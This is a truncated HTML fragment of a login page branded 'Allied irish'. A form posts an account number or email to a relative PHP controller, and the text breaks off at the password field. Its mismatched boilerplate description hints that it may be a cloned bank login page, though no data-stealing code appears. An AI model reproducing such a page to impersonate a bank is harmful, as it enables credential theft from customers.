...
<head>
    ...
    <meta name="og:description" property="og:description" content="Allied irish bank is an independent, full-service, investment advisory and consulting firm serving the investing public by providing advice and customized solutions.">
    <meta name="og:image" property="og:image" itemprop="image" content="images/aib_logo.png">
    <meta property="og:image:width" content="300" />
    <meta property="og:image:height" content="300" />
    <title>Allied irish | Login</title>
                ...
                <div class="login_page">
                    ...
                    <form action="../controller/login.php" method="POST">
                        <div class="data">
                            ...
                            <input type="text" name="user_email" id="user_email" placeholder="Enter account number or Email address" required>
                        </div>
                        <div class="data">
                            <div class="pass">
